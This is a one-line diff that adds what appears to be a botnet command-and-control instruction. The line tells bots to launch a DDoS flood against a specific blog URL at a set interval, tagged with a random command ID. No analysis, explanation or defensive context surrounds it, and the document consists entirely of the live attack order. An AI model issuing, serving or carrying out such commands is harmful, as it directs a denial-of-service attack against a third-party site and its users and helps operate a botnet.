@@ -1,0 +1,1 @@
+<INPUTCOMMAND>DDOS[I=30][P=http://codesoft.cc/blog/?cat=] <RAND01.01.1970562208>ID:01.01.1970562208<br>
